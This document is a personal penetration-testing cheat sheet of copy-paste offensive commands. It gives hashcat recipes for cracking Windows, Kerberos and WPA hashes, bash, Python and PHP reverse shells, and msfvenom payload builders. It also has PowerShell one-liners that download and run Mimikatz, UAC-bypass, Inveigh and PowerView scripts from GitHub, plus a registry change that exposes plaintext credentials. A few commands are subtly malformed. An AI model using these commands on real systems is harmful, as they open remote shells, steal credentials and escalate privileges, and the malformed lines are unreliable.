---
description: This will be a section for my quick references/cheatsheets
---

# 📕 Quick References

## Hackcraking

### NTLM:

```bash
hashcat -m 1000 ntlm-hashes.txt wordlist -o Cracked.txt -O
```

```bash
hashcat -m 1000 ntlm-hashes.txt -r rule wordlist -o Cracked.txt -O
```

```bash
hashcat -m 1000 -w 3 ntlm-hashes.txt -r rule wordlist -o Cracked.txt -O
```

### NTLMv2:

```bash
hashcat -m 5600 ntlmv2-hashes.txt wordlist -o Cracked.txt -O
```

```bash
hashcat -m 5600 ntlmv2-hashes.txt -r rule wordlist -o Cracked.txt -O
```

```bash
hashcat -m 5600 -w 3 ntlmv2-hashes.txt -r rule wordlist -o Cracked.txt -O
```

### Kerberoast:

```bash
hashcat -m 13100 kerb-hashes.txt wordlist -o Cracked.txt -O
```

```bash
hashcat -m 13100 kerb-hashes.txt -r rule wordlist -o Cracked.txt -O
```

```bash
hashcat -m 13100 -w 3 kerb-hashes.txt -r rule wordlist -o Cracked.txt -O
```

### AS-REP:

```bash
hashcat -m 18200 asrep-hashes.txt wordlist -o Cracked.txt -O
```

```bash
hashcat -m 18200 asrep-hashes.txt -r rule wordlist -o Cracked.txt -O
```

```bash
hashcat -m -w 3 18200 asrep-hashes.txt -r rule wordlist -o Cracked.txt -O
```

### WPA/PMKID

```bash
hashcat -m 22000 wpa-hashes.txt wordlist -o Cracked.txt -O
```

```bash
hashcat -m 22000 wpa-hashes.txt -r rule wordlist -o Cracked.txt -O
```

```bash
hashcat -m -w 3 22000 wpa-hashes.txt -r rule wordlist -o Cracked.txt -O
```

## Reverse Shells

MANY more on [PayloadAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/) - These are my more commonly used ones

### Bash

#### TCP <a href="#bash-tcp" id="bash-tcp"></a>

```
bash -i >& /dev/tcp/IP/port 0>&1

0<&196;exec 196<>/dev/tcp/IP/port; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/IP/port 0<&1 2>&1
```

#### UDP <a href="#bash-udp" id="bash-udp"></a>

```
Victim:
sh -i >& /dev/udp/IP/port 0>&1

Listener:
nc -u -lvp port
```

### Python

#### IPv4

```
export RHOST="IP";export RPORT=port;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

#### IPv4 (No Spaces)

```
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

```
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("IP",port));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("IP",port));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("IP",port));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

```
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("IP",port));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```
python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("IP",port));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("IP",port));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

### PHP <a href="#php" id="php"></a>

```
php -r '$sock=fsockopen("IP",port);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",port);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("IP",port);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",port);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("IP",port);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Meterpreter <a href="#ruby" id="ruby"></a>

#### Windows Staged reverse TCP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=port -f exe > reverse.exe
```

#### Windows Stageless reverse TCP <a href="#windows-stageless-reverse-tcp" id="windows-stageless-reverse-tcp"></a>

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f exe > reverse.exe
```

#### Linux Staged reverse TCP

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=port -f elf >reverse.elf
```

#### Linux Stageless reverse TCP

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=port -f elf >reverse.elf
```

### MSFVenom

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="IP" LPORT=port -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="IP" LPORT=port -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="IP" LPORT=port -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="IP" LPORT=port -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="IP" LPORT=port -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="IP" LPORT=port -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="IP" LPORT=port -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="IP" LPORT=port -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="IP" LPORT=port -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="IP" LPORT=port -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## Post Exploitation

### Upgrade to usable shell

* Find python version

```bash
which python
```

```bash
# Depending which python version
python -c 'import pty; pty.spawn("/bin/bash")' upgrade shell

python3 -c 'import pty; pty.spawn("/bin/bash")' upgrade shell
```

## Powershell Oneliners

* Invoke-BypassUAC and start PowerShell prompt as Administrator \[Or replace to run any other command]

```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
```

* Invoke-Mimikatz: Dump credentials from memory

```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

* Import Mimikatz Module to run further commands

```powershell
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
```

* Invoke-MassMimikatz: Use to dump creds on remote host

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
```

* PowerUp: Privilege escalation checks

```powershell
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
```

* Invoke-Inveigh and log output to file

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"
```

* Invoke-ShareFinder and print output to file

```powershell
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
```

* Import PowerView Module to run further commands

```powershell
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
```

* Invoke-Bloodhound

```powershell
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
```

* Find GPP Passwords in SYSVOL

```powershell
findstr /S cpassword $env:logonserver\sysvol\*.xml findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
```

* Run Powershell prompt as a different user, without loading profile to the machine

```powershell
runas /user:DOMAIN\USER /noprofile powershell.exe
```

* Insert reg key to enable Wdigest on newer versions of Windows

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
```
